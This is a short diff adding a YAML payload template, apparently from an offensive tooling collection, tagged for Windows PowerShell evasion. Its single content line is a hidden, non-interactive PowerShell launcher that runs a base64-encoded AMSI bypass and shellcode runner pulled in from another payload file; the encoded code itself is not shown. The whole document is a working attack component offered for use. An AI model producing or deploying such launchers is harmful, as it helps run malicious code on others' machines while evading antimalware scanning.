@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "transfer-amsi-bypass-shellcode-runner-windows-powershell-base64encoded.yaml"
+  tags: ["windows", "powershell", "evasion"]
+  created: "2026-05-30"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |-
+  powershell.exe -NoP -NonI -W Hidden -Enc {{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell.yaml') | base64_pwsh }}
